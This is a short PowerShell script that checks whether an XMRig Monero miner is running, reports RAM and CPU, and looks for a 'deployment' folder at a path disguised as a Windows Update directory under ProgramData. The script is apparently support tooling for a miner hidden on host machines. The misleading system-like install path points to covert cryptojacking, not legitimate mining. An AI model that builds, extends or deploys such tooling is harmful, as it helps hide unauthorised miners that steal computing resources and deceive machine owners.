param([switch]$Repair)

Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "   UNIVERSAL MINER STATUS CHECK - MINIMAL VERSION" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan

Write-Host "`n[1] Checking XMRig Process..." -ForegroundColor Yellow
$processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
if ($processes) {
    Write-Host "✓ XMRig is running" -ForegroundColor Green
} else {
    Write-Host "✗ XMRig is NOT running" -ForegroundColor Red
}

Write-Host "`n[2] Checking System Info..." -ForegroundColor Yellow
$memory = Get-WmiObject Win32_ComputerSystem
$totalRAM = [math]::Round($memory.TotalPhysicalMemory / 1GB, 1)
Write-Host "✓ Total RAM: $totalRAM GB" -ForegroundColor Green

$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
Write-Host "✓ CPU: $($cpu.Name)" -ForegroundColor Green

Write-Host "`n[3] Checking Deployment..." -ForegroundColor Yellow
$testPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
if (Test-Path $testPath) {
    Write-Host "✓ Main deployment path exists: $testPath" -ForegroundColor Green
} else {
    Write-Host "✗ Main deployment path missing: $testPath" -ForegroundColor Red
}

if ($Repair) {
    Write-Host "`n🔧 REPAIR MODE - This would run repair functions" -ForegroundColor Green
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host "   STATUS CHECK COMPLETED - NO SYNTAX ERRORS!" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
